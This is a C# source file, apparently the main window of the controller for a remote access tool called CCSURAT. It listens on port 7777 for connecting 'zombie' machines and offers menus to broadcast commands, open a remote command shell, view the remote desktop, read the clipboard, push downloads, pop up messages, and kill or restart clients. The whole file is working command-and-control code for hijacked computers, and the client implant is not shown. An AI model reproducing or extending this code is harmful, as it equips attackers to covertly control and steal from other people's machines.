using CCSURAT_Server.ControlForms;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace CCSURAT_Server
{
    public partial class ServerMainForm : Form
    {
        // Port that we will listen to connection on.
        private static int listenPort = 7777;

        private Listener listener;
        private List<Listener> listeners;

        // Store active connection in a list
        public List<Zombie> zombies = new List<Zombie>();
        private ListViewHitTestInfo selected;
        private int totalConnections;

        public ServerMainForm()
        {
            InitializeComponent();
            listeners = new List<Listener>();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // start the connection listener on port, pass current zombies list
            ListenOnPort(listenPort);

            // start ping timer that pings clients every x seconds.
            pingTimer.Start();
            this.Text = "CCSURAT-Server v" + Application.ProductVersion;

            zombieListView.ControlRemoved += new System.Windows.Forms.ControlEventHandler(this.zombieListView_ControlRemoved);
            //this.ControlAdded += new System.Windows.Forms.ControlEventHandler(this.Control_Added);
        }

        // Create a new listener on specified port.
        private void ListenOnPort(int port)
        {
            Listener listener = new Listener(this, zombies, port);
            listeners.Add(listener);
            Thread thread = new Thread(new ThreadStart(listener.Listen));
            thread.Start();

            // update port list status
            portListTextbox.Text = "Listening on port(s): ";
            foreach (Listener l in listeners)
                portListTextbox.Text += l.port + ", ";
            portListTextbox.Text = portListTextbox.Text.Substring(0, portListTextbox.Text.Length - 2);

        }

        private void sendButton_Click(object sender, EventArgs e)
        {
            // send data to all zombies.
            foreach(Zombie z in zombies)
            {
                z.SendData(cmdTextbox.Text);
            }
        }

        public void Log(string s)
        {
            // this is needed for any method on the main form called from the zombie thread.
            if (InvokeRequired)
            {
                this.Invoke(new Action<string>(Log), new object[] { s });
                return;
            }
            if (!disableConsoleCheckbox.Checked)
            {
                // appends log data to the console, including time of logging
                console.AppendText("[ " + string.Format("{0:hh:mm:ss tt}", DateTime.Now) + " ] " + s + "\n");
                console.ScrollToCaret();
            }
        }

        // Select the item at the mouse X/Y and store it, show control menus at that X/Y.
        private void zombieListView_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                selected = zombieListView.HitTest(e.X, e.Y);
                if (selected.Item != null)
                    if (selected.Item.ForeColor != Color.Gray)
                        clientControl.Show(zombieListView, e.Location);
                    else if (selected.Item.ForeColor == Color.Gray)
                        removeControl.Show(zombieListView, e.Location);
                    else
                    {

                    }
            }
        }

        private void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendSelected("[[KILL]][[/KILL]]");
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendSelected("[[RESTART]][[/RESTART]]");
        }

        // Send command+data to selected clients.
        private void SendSelected(string s)
        {
            foreach(ZombieListItem zItem in zombieListView.SelectedItems)
                zItem.zombieClient.SendData(s);
        }

        // Update status labels
        public void UpdateStatus()
        {
            if (InvokeRequired)
            {
                this.Invoke(new Action(UpdateStatus));
                return;
            }
            totalConnections++;
            if (zombies.Count == 0)
                curConLabel.Text = "Current connections: 0";
            else {
                curConLabel.Text = "Current connections: " + zombies.Count;
                totalConLabel.Text = "Total connections: " + totalConnections;
            }
            //foreach (Zombie z in zombies)
            //    Console.Write(z.ToString() + ", ");
        }

        // Did not seem to work, will wait on removing.
        private void zombieListView_ControlRemoved(object sender, ControlEventArgs e)
        {
            Log("Control removed.");
            foreach (Zombie z in zombies)
                if (!z.IsActive())
                {
                    Log(z + " inactive, removing.");
                    zombies.Remove(z);
                }
            UpdateStatus();
        }

        // Send MessageBox message to all selected client machines.
        private void sendMessageToolStripMenuItem_Click(object sender, EventArgs e)
        {
            InputBox input = new InputBox();
            string msg = input.Show("Send Message", "Input message to send: ", "Send");
            if(msg != null)
                SendSelected("[[MESSAGE]]" + msg + "[[/MESSAGE]]");
        }

        // Remove selected disconnected clients. (Gray colored rows.)
        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(selected.Item != null)
                foreach (ZombieListItem zItem in zombieListView.SelectedItems)
                    if(zItem.ForeColor == Color.Gray)
                        zombieListView.Items.Remove(zItem);
        }

        // Open clipboard control form for all selected clients.
        private void clipboardToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (selected.Item != null)
                foreach (ZombieListItem zItem in zombieListView.SelectedItems)
                {
                    if (zItem.ForeColor != Color.Gray)
                    {
                        ControlForms.Clipboard clipboard = new ControlForms.Clipboard(zItem.zombieClient);
                        clipboard.Show();
                    }
                }
        }

        // Open Remote CMD control form for all selected clients.
        private void remoteCMDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (selected.Item != null)
                foreach (ZombieListItem zItem in zombieListView.SelectedItems)
                {
                    if (zItem.ForeColor != Color.Gray)
                    {
                        RemoteCMD remoteCMD = new RemoteCMD(zItem.zombieClient);
                        remoteCMD.Show();
                    }
                }
        }

        // Create new listener on input port.
        private void listenOnPortToolStripMenuItem_Click(object sender, EventArgs e)
        {
            InputBox input = new InputBox();
            ListenOnPort(Convert.ToInt32(input.Show("Port selection", "Listen on port: ", "", "OK")));
        }

        private void remoteDownloadToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (selected.Item != null)
                foreach (ZombieListItem zItem in zombieListView.SelectedItems)
                {
                    if (zItem.ForeColor != Color.Gray)
                    {
                        RemoteDownloader remoteDownloader = new RemoteDownloader(zItem.zombieClient);
                        remoteDownloader.Show();
                    }
                }
        }

        private void remoteDownloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RemoteDownloader remoteDownloader = new RemoteDownloader(zombies);
            remoteDownloader.Show();
        }

        // Handle Ctrl+A (Select all)
        private void zombieListView_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.A && e.Control)
            {
                zombieListView.MultiSelect = true;
                foreach (ListViewItem item in zombieListView.Items)
                    item.Selected = true;
            }
        }

        private void pingTimer_Tick(object sender, EventArgs e)
        {
            // Refresh all connected client's pings
            foreach(Zombie z in zombies)
            {
                z.UpdatePing();
            }
        }

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (selected.Item != null)
                foreach (ZombieListItem zItem in zombieListView.SelectedItems)
                {
                    if (zItem.ForeColor != Color.Gray)
                    {
                        RemoteDesktop remoteDesktop = new RemoteDesktop(zItem.zombieClient);
                        remoteDesktop.Show();
                    }
                }
        }
    }

    // custom listitem that contains the zombie client object
    public class ZombieListItem : ListViewItem
    {
        private Zombie zombie;
        public Zombie zombieClient
        {
            get { return zombie; }
            set { zombie = value; }
        }
        public ZombieListItem(Zombie z) : base()
        {
            zombie = z;
        }
    }
}
